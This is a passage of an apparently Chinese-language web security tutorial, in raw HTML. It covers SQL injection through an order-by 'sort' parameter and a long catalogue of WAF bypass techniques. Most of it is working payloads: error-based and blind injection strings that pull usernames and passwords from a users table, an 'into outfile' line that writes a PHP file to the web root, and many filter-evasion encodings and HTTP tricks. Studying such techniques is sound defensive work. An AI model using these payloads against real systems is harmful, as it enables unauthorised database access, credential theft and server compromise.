class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?sort<span class=\"operator\">=</span>rand()</span><br><span class=\"line\">?sort<span class=\"operator\">=</span><span class=\"number\">1</span> <span class=\"keyword\">and</span> rand()</span><br></pre></td></tr></table></figure>\n\n<p>延时验证，延时的时间为 (行数 * 1) 秒</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?sort<span class=\"operator\">=</span>sleep(<span class=\"number\">1</span>)</span><br><span class=\"line\">?sort<span class=\"operator\">=</span><span class=\"number\">1</span> <span class=\"keyword\">and</span> sleep(<span class=\"number\">1</span>)</span><br></pre></td></tr></table></figure>\n\n<p><strong>利用方式</strong></p>\n<p>报错注入</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?sort<span class=\"operator\">=</span><span class=\"number\">1</span> <span class=\"keyword\">and</span> (<span class=\"keyword\">select</span> <span class=\"number\">1</span> <span class=\"keyword\">from</span> (<span class=\"keyword\">select</span> <span class=\"built_in\">count</span>(<span class=\"operator\">*</span>),concat((<span class=\"keyword\">select</span> concat(username,password) <span class=\"keyword\">from</span> users limit <span class=\"number\">0</span>,<span class=\"number\">1</span>),<span class=\"built_in\">floor</span>(rand(<span class=\"number\">0</span>)<span class=\"operator\">*</span><span class=\"number\">2</span>))x <span class=\"keyword\">from</span> information_schema.tables <span class=\"keyword\">group</span> <span class=\"keyword\">by</span> x)a)<span class=\"operator\">%</span><span class=\"number\">23</span> # <span class=\"built_in\">floor</span>()</span><br><span class=\"line\">?sort<span class=\"operator\">=</span><span class=\"number\">1</span> <span class=\"keyword\">procedure</span> analyse(extractvalue(rand(),concat(<span class=\"number\">0x3a</span>,version())),<span class=\"number\">1</span>) # <span class=\"keyword\">procedure</span> analyse</span><br></pre></td></tr></table></figure>\n\n<p>布尔盲注和时间盲注使用<code>rand()</code>函数即可</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?sort<span class=\"operator\">=</span>rand(<span class=\"keyword\">left</span>(database(),<span class=\"number\">1</span>)<span class=\"operator\">&gt;</span><span class=\"string\">&#x27;r&#x27;</span>)</span><br><span class=\"line\">?sort<span class=\"operator\">=</span>rand(if(ascii(substr(database(),<span class=\"number\">1</span>,<span class=\"number\">1</span>))<span class=\"operator\">&gt;</span><span class=\"number\">114</span>,<span class=\"number\">1</span>,sleep(<span class=\"number\">1</span>)))</span><br></pre></td></tr></table></figure>\n\n<p>写入文件，使用<code>lines terminated by</code>，<code>0x3c3f70687020706870696e666f28293b3f3e</code>是<code>&lt;php phpinfo();&gt;</code>的十六进制编码。</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?sort<span class=\"operator\">=</span><span class=\"number\">1</span> <span class=\"keyword\">into</span> outfile &quot;/var/www/html/less46.php&quot; lines terminated <span class=\"keyword\">by</span> <span class=\"number\">0x3c3f70687020706870696e666f28293b3f3e</span></span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"2-SQL注入绕过\"><a href=\"#2-SQL注入绕过\" class=\"headerlink\" title=\"2. SQL注入绕过\"></a>2. SQL注入绕过</h2><h3 id=\"2-1-空格字符绕过\"><a href=\"#2-1-空格字符绕过\" class=\"headerlink\" title=\"2.1 空格字符绕过\"></a>2.1 空格字符绕过</h3><p><code>%a0</code>：空格</p>\n<p><code>%09</code>：TAB键（水平）</p>\n<p><code>%0a</code>：新建一行</p>\n<p><code>%0c</code>：新的一页</p>\n<p><code>%0d</code>：return功能</p>\n<p><code>%0b</code>：TAB键（垂直）</p>\n<p><code>%00</code>：空字符</p>\n<p><code>/**/</code>：替换空格</p>\n<p><code>/*!*/</code>：内联注释</p>\n<h3 id=\"2-2-大小写绕过\"><a href=\"#2-2-大小写绕过\" class=\"headerlink\" title=\"2.2 大小写绕过\"></a>2.2 大小写绕过</h3><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"operator\">-</span><span class=\"operator\">&gt;</span> <span class=\"keyword\">UniOn</span> <span class=\"keyword\">SelEcT</span></span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"2-3-浮点数绕过\"><a href=\"#2-3-浮点数绕过\" class=\"headerlink\" title=\"2.3 浮点数绕过\"></a>2.3 浮点数绕过</h3><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> users <span class=\"keyword\">where</span> id<span class=\"operator\">=</span><span class=\"number\">8E0</span><span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>;</span><br><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> users <span class=\"keyword\">where</span> id<span class=\"operator\">=</span><span class=\"number\">8.0</span><span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>;</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"2-4-NULL绕过\"><a href=\"#2-4-NULL绕过\" class=\"headerlink\" title=\"2.4 NULL绕过\"></a>2.4 NULL绕过</h3><p><code>\\N</code>代表NULL</p>\n<h3 id=\"2-5-引号绕过\"><a href=\"#2-5-引号绕过\" class=\"headerlink\" title=\"2.5 引号绕过\"></a>2.5 引号绕过</h3><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> users <span class=\"keyword\">where</span> id<span class=\"operator\">=</span>&quot;1&quot; #双引号绕过</span><br><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> users <span class=\"keyword\">where</span> username<span class=\"operator\">=</span><span class=\"number\">0x61646D696E</span>; # 字符串转换为<span class=\"number\">16</span>进制</span><br><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> users <span class=\"keyword\">where</span> id<span class=\"operator\">=</span><span class=\"number\">-1</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>,<span class=\"number\">2</span>,(<span class=\"keyword\">select</span> group_concat(column_name)</span><br><span class=\"line\"><span class=\"keyword\">from</span> information_schema.columns <span class=\"keyword\">where</span> TABLE_NAME<span class=\"operator\">=</span><span class=\"string\">&#x27;users&#x27;</span> limit <span class=\"number\">1</span>),<span class=\"number\">4</span>; # 如果开启gpc，整数型也可以用十六进制绕过</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"2-6-添加库名绕过\"><a href=\"#2-6-添加库名绕过\" class=\"headerlink\" title=\"2.6 添加库名绕过\"></a>2.6 添加库名绕过</h3><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> users <span class=\"keyword\">where</span> id<span class=\"operator\">=</span><span class=\"number\">-1</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span> <span class=\"keyword\">from</span> users;</span><br><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> users <span class=\"keyword\">where</span> id<span class=\"operator\">=</span><span class=\"number\">-1</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span> <span class=\"keyword\">from</span> test.users;</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"2-7-去重复绕过\"><a href=\"#2-7-去重复绕过\" class=\"headerlink\" title=\"2.7 去重复绕过\"></a>2.7 去重复绕过</h3><p>在 mysql 查询可以使用 distinct 去除查询的重复值。可以利用这点突破waf 拦截。</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> users <span class=\"keyword\">where</span> id<span class=\"operator\">=</span><span class=\"number\">-1</span> <span class=\"keyword\">union</span> <span class=\"keyword\">distinct</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span> <span class=\"keyword\">from</span> users;</span><br><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> users <span class=\"keyword\">where</span> id<span class=\"operator\">=</span><span class=\"number\">-1</span> <span class=\"keyword\">union</span> <span class=\"keyword\">distinct</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,version() fromusers;</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"2-8-反引号绕过\"><a href=\"#2-8-反引号绕过\" class=\"headerlink\" title=\"2.8 反引号绕过\"></a>2.8 反引号绕过</h3><p>字段加反引号可以绕过一些WAF拦截。</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> users <span class=\"keyword\">where</span> id<span class=\"operator\">=</span><span class=\"number\">-1</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span> <span class=\"keyword\">from</span> `test.users`;</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"2-9-语言特性绕过\"><a href=\"#2-9-语言特性绕过\" class=\"headerlink\" title=\"2.9 语言特性绕过\"></a>2.9 语言特性绕过</h3><p>在 php 语言中 id&#x3D;1&amp;id&#x3D;2 后面的值会自动覆盖前面的值，不同的语言有不同的特性。可以利用这点绕过一些 waf 的拦截。</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">服务器中间件</th>\n<th align=\"center\">解析结果</th>\n<th align=\"center\">举例说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">ASP.NET&#x2F;IIS</td>\n<td align=\"center\">所有出现的参数值用逗号连接</td>\n<td align=\"center\">color&#x3D;red,blue</td>\n</tr>\n<tr>\n<td align=\"center\">ASP&#x2F;IIS</td>\n<td align=\"center\">所有出现的参数用逗号连接</td>\n<td align=\"center\">color&#x3D;red,blue</td>\n</tr>\n<tr>\n<td align=\"center\">PHP&#x2F;Apache</td>\n<td align=\"center\">仅最后一次出现参数值</td>\n<td align=\"center\">color&#x3D;blue</td>\n</tr>\n<tr>\n<td align=\"center\">PHP&#x2F;Zeus</td>\n<td align=\"center\">仅最后一次出现参数值</td>\n<td align=\"center\">color&#x3D;blue</td>\n</tr>\n<tr>\n<td align=\"center\">JSP,Servlet&#x2F;Apache Tomcat</td>\n<td align=\"center\">仅第一次出现参数值</td>\n<td align=\"center\">color&#x3D;red</td>\n</tr>\n<tr>\n<td align=\"center\">JSP,Servlet&#x2F;Oracle Application Server 10g</td>\n<td align=\"center\">仅第一次出现参数值</td>\n<td align=\"center\">color&#x3D;red</td>\n</tr>\n<tr>\n<td align=\"center\">JSP,Servlet&#x2F;Jetty</td>\n<td align=\"center\">仅第一次出现参数值</td>\n<td align=\"center\">color&#x3D;red</td>\n</tr>\n<tr>\n<td align=\"center\">IBM Lotus Domino</td>\n<td align=\"center\">仅最后一次出现参数值</td>\n<td align=\"center\">color&#x3D;blue</td>\n</tr>\n<tr>\n<td align=\"center\">IBM HTTP Server</td>\n<td align=\"center\">仅第一次出现参数值</td>\n<td align=\"center\">color&#x3D;red</td>\n</tr>\n<tr>\n<td align=\"center\">mod_perl,libapreq2&#x2F;Apache</td>\n<td align=\"center\">仅第一次出现参数值</td>\n<td align=\"center\">color&#x3D;red</td>\n</tr>\n<tr>\n<td align=\"center\">Perl CGI&#x2F;Apache</td>\n<td align=\"center\">仅第一次出现参数值</td>\n<td align=\"center\">color&#x3D;red</td>\n</tr>\n<tr>\n<td align=\"center\">mod_wsgi(Python)&#x2F;Apache</td>\n<td align=\"center\">仅第一次出现参数值</td>\n<td align=\"center\">color&#x3D;red</td>\n</tr>\n<tr>\n<td align=\"center\">Python&#x2F;Zope</td>\n<td align=\"center\">转化为List</td>\n<td align=\"center\">color&#x3D;[‘red’,’blue’]</td>\n</tr>\n</tbody></table>\n<h3 id=\"2-10-逗号绕过\"><a href=\"#2-10-逗号绕过\" class=\"headerlink\" title=\"2.10 逗号绕过\"></a>2.10 逗号绕过</h3><p><code>substr</code></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span>(substr(database() <span class=\"keyword\">from</span> <span class=\"number\">1</span> <span class=\"keyword\">for</span> <span class=\"number\">1</span>);</span><br></pre></td></tr></table></figure>\n\n<p><code>mid</code></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> mid(database() <span class=\"keyword\">from</span> <span class=\"number\">1</span> <span class=\"keyword\">for</span> <span class=\"number\">1</span>);</span><br></pre></td></tr></table></figure>\n\n<p><code>join</code></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> <span class=\"number\">1</span>,<span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> (<span class=\"keyword\">select</span> <span class=\"number\">1</span>)a <span class=\"keyword\">join</span> (<span class=\"keyword\">select</span> <span class=\"number\">2</span>)b</span><br></pre></td></tr></table></figure>\n\n<p><code>like</code></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"keyword\">user</span>() <span class=\"keyword\">like</span> <span class=\"string\">&#x27;%r%&#x27;</span>;</span><br></pre></td></tr></table></figure>\n\n<p><code>offset</code></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">limit <span class=\"number\">1</span> <span class=\"keyword\">offset</span> <span class=\"number\">0</span></span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"2-11-or-and-xor-not绕过\"><a href=\"#2-11-or-and-xor-not绕过\" class=\"headerlink\" title=\"2.11 or and xor not绕过\"></a>2.11 or and xor not绕过</h3><p><code>&amp;&amp;</code>等价于and</p>\n<p><code>||</code>等价于or</p>\n<p><code>!</code>等价于not</p>\n<p><code>|</code>等价于xor</p>\n<h3 id=\"2-12-ASCII字符对比绕过\"><a href=\"#2-12-ASCII字符对比绕过\" class=\"headerlink\" title=\"2.12 ASCII字符对比绕过\"></a>2.12 ASCII字符对比绕过</h3><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> users <span class=\"keyword\">where</span> id<span class=\"operator\">=</span><span class=\"number\">1</span> <span class=\"keyword\">and</span> ascii(<span class=\"built_in\">substring</span>(<span class=\"keyword\">user</span>(),<span class=\"number\">1</span>,<span class=\"number\">1</span>))<span class=\"operator\">=</span><span class=\"number\">114</span>; # <span class=\"type\">char</span>(<span class=\"number\">114</span>)<span class=\"operator\">=</span><span class=\"string\">&#x27;r&#x27;</span></span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"2-13-等号绕过\"><a href=\"#2-13-等号绕过\" class=\"headerlink\" title=\"2.13 等号绕过\"></a>2.13 等号绕过</h3><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ascii(<span class=\"built_in\">substring</span>(<span class=\"keyword\">user</span>(),<span class=\"number\">1</span>,<span class=\"number\">1</span>))<span class=\"operator\">&lt;</span><span class=\"number\">115</span>; # <span class=\"operator\">&gt;</span> <span class=\"operator\">&lt;</span></span><br><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"built_in\">substring</span>(<span class=\"keyword\">user</span>(),<span class=\"number\">1</span>,<span class=\"number\">1</span>)<span class=\"keyword\">like</span> <span class=\"string\">&#x27;r%&#x27;</span>; #<span class=\"keyword\">like</span> rlike</span><br><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"keyword\">user</span>() regexp <span class=\"string\">&#x27;^r&#x27;</span>; # regexp</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"2-14-双写绕过\"><a href=\"#2-14-双写绕过\" class=\"headerlink\" title=\"2.14 双写绕过\"></a>2.14 双写绕过</h3><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uniunionon seleselectct</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"2-15-二次编码绕过\"><a href=\"#2-15-二次编码绕过\" class=\"headerlink\" title=\"2.15 二次编码绕过\"></a>2.15 二次编码绕过</h3><p><code>-1 union select 1,2,3,4# </code></p>\n<p>第一次编码：</p>\n<p><code>%2d%31%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%31%2c%32%2c%33%2c%34%23 </code></p>\n<p>第二次编码：</p>\n<p><code>%25%32%64%25%33%31%25%32%30%25%37%35%25%36%65%25%36%39%25%36%66%25%36%65%25%32%30%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%33%31%25%32%63%25%33%32%25%32%63%25%33%33%25%32%63%25%33%34%25%32%33</code></p>\n<h3 id=\"2-16-参数拆分绕过\"><a href=\"#2-16-参数拆分绕过\" class=\"headerlink\" title=\"2.16 参数拆分绕过\"></a>2.16 参数拆分绕过</h3><p>对于a&#x3D;[input1]&amp;b&#x3D;[input2] 可以将参数 a 和 b 拼接在 SQL 语句中，但是过滤了<code>union select</code>，可以使用参数拆分</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">-1</span><span class=\"string\">&#x27;union/*&amp;username=*/select 1,user(),3,4--+</span></span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"2-17-生僻函数绕过\"><a href=\"#2-17-生僻函数绕过\" class=\"headerlink\" title=\"2.17 生僻函数绕过\"></a>2.17 生僻函数绕过</h3><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> polygon((<span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> (<span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> (<span class=\"keyword\">select</span> @<span class=\"variable\">@version</span>) f) x)); # polygon()替换updatexml()</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"2-18-分块传输绕过\"><a href=\"#2-18-分块传输绕过\" class=\"headerlink\" title=\"2.18 分块传输绕过\"></a>2.18 分块传输绕过</h3><p>​\t如果在 http 的消息头里 Transfer-Encoding 为 chunked，那么就是使用chunk编码方式。</p>\n<p>​\t接下来会发送数量未知的块，每一个块的开头都有一个十六进制的数,表明这个块的大小，然后接 CRLF(“\\r\\n”)。然后是数据本身，数据结束后，还会有CRLF(“\\r\\n”)两个字符。有一些实现中，块大小的十六进制数和CRLF 之间可以有空格，最后一块大小为0，表示数据发送结束。</p>\n<h3 id=\"2-19-信任白名单绕过\"><a href=\"#2-19-信任白名单绕过\" class=\"headerlink\" title=\"2.19 信任白名单绕过\"></a>2.19 信任白名单绕过</h3><p>WAF会自带一些文件白名单，可以利用白名单绕过</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"operator\">/</span>phpmyadmin?name<span class=\"operator\">=</span><span class=\"operator\">%</span><span class=\"number\">27</span><span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"keyword\">union</span><span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"keyword\">select</span><span class=\"operator\">%</span><span class=\"number\">201</span>,<span class=\"keyword\">user</span>()<span class=\"comment\">--+&amp;submit=1</span></span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"2-20-pipline绕过\"><a href=\"#2-20-pipline绕过\" class=\"headerlink\" title=\"2.20 pipline绕过\"></a>2.20 pipline绕过</h3><p>​\thttp协议是由tcp协议封装而来，当浏览器发起一个http请求时，浏览器先和服务器建立起连接tcp连接，然后发送http数据包（即我们用burpsuite截获的数据），其中包含了一个Connection字段，一般值为close，Apache等容器根据这个字段决定是保持该tcp连接或是断开。当发送的内容太大，超过一个http 包容量，需要分多次发送时，值会变成 keep-alive，即本次发起的http 请求所建立的tcp连接不断开，直到所发送内容结束 Connection 为 close 为止。</p>\n<p>​\t用burpsuite抓包提交，复制整个包信息放在第一个包最后，把第一个包close改成keep-alive把brupsuite自动更新Content-Length勾去掉，有些WAF不会对第一个包的参数进行检测。</p>\n<h3 id=\"2-21-利用multipart-form-data绕过\"><a href=\"#2-21-利用multipart-form-data绕过\" class=\"headerlink\" title=\"2.21 利用multipart&#x2F;form-data绕过\"></a>2.21 利用multipart&#x2F;form-data绕过</h3><p>​\tmultipart&#x2F;form-data 表示该数据被编码为一条消息，页上的每个控件对应消息中的一个部分。所以，当 waf 没有规则匹配该协议传输的数据时可被绕过。</p>\n<h3 id=\"2-22-order-by-绕过\"><a href=\"#2-22-order-by-绕过\" class=\"headerlink\" title=\"2.22 order by 绕过\"></a>2.22 order by 绕过</h3><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> users <span class=\"keyword\">where</span> id<span class=\"operator\">=</span><span class=\"number\">1</span> <span class=\"keyword\">into</span> <span class=\"variable\">@a</span>,<span class=\"variable\">@b</span>,<span class=\"variable\">@c</span>,<span class=\"variable\">@d</span>; # 替代<span class=\"keyword\">order</span> <span class=\"keyword\">by</span>猜解字段数</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"2-23-修改请求方式绕过\"><a href=\"#2-23-修改请求方式绕过\" class=\"headerlink\" title=\"2.23 修改请求方式绕过\"></a>2.23 修改请求方式绕过</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$_REQUEST</span>[<span class=\"string\">&#x27;id&#x27;</span>];</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>可以更改请求方式尝试绕过。</p>\n<h3 id=\"2-24-大量字符绕过\"><a href=\"#2-24-大量字符绕过\" class=\"headerlink\" title=\"2.24 大量字符绕过\"></a>2.24 大量字符绕过</h3><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id<span class=\"operator\">=</span><span class=\"number\">1</span> <span class=\"keyword\">and</span> (<span class=\"keyword\">select</span> <span class=\"number\">1</span>)<span class=\"operator\">=</span>(<span class=\"keyword\">select</span> <span class=\"number\">0xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span>)<span class=\"comment\">/*!union*/</span><span class=\"comment\">/*!select*/</span><span class=\"number\">1</span>,<span class=\"keyword\">user</span>()</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"2-25-花括号绕过\"><a href=\"#2-25-花括号绕过\" class=\"headerlink\" title=\"2.25 花括号绕过\"></a>2.25 花括号绕过</h3><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"number\">1</span>,<span class=\"number\">2</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span>&#123;x <span class=\"number\">1</span>&#125;,<span class=\"keyword\">user</span>(); # 花括号左边是注释的内容</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"2-26-union-select绕过\"><a href=\"#2-26-union-select绕过\" class=\"headerlink\" title=\"2.26 union select绕过\"></a>2.26 union select绕过</h3><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sel<span class=\"operator\">&lt;&gt;</span>ect # 程序过滤<span class=\"operator\">&lt;&gt;</span>为空 脚本处理</span><br><span class=\"line\">sele<span class=\"comment\">/**/</span>ct # 程序过滤<span class=\"comment\">/**/</span>为空</span><br><span class=\"line\"><span class=\"comment\">/*!%53eLEct*/</span> # url 编码与内联注释</span><br><span class=\"line\">se<span class=\"operator\">%</span><span class=\"number\">0</span>blect # 使用空格绕过</span><br><span class=\"line\">sele<span class=\"operator\">%</span>ct # 使用百分号绕过</span><br><span class=\"line\"><span class=\"operator\">%</span><span class=\"number\">53</span>eLEct # 编码绕过</span><br><span class=\"line\"><span class=\"keyword\">uNIoN</span> <span class=\"keyword\">sELecT</span> <span class=\"number\">1</span>,<span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"keyword\">union</span> <span class=\"keyword\">all</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>,<span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"keyword\">union</span> <span class=\"keyword\">DISTINCT</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>,<span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"keyword\">null</span><span class=\"operator\">+</span><span class=\"keyword\">UNION</span><span class=\"operator\">+</span><span class=\"keyword\">SELECT</span><span class=\"operator\">+</span><span class=\"number\">1</span>,<span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"comment\">/*!union*/</span><span class=\"comment\">/*!select*/</span><span class=\"number\">1</span>,<span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"keyword\">union</span><span class=\"comment\">/**/</span><span class=\"keyword\">select</span><span class=\"comment\">/**/</span><span class=\"number\">1</span>,<span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"keyword\">and</span>(<span class=\"keyword\">select</span> <span class=\"number\">1</span>)<span class=\"operator\">=</span>(<span class=\"keyword\">Select</span> <span class=\"number\">0xA</span><span class=\"operator\">*</span><span class=\"number\">1000</span>)<span class=\"comment\">/*!uNIOn*/</span><span class=\"comment\">/*!SeLECt*/</span> <span class=\"number\">1</span>,<span class=\"keyword\">user</span>()</span><br><span class=\"line\"><span class=\"comment\">/*!50000union*/</span><span class=\"comment\">/*!50000select*/</span><span class=\"number\">1</span>,<span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"comment\">/*!40000union*/</span><span class=\"comment\">/*!40000select*/</span><span class=\"number\">1</span>,<span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"operator\">%</span><span class=\"number\">0</span>aunion<span class=\"operator\">%</span><span class=\"number\">0</span>aselect <span 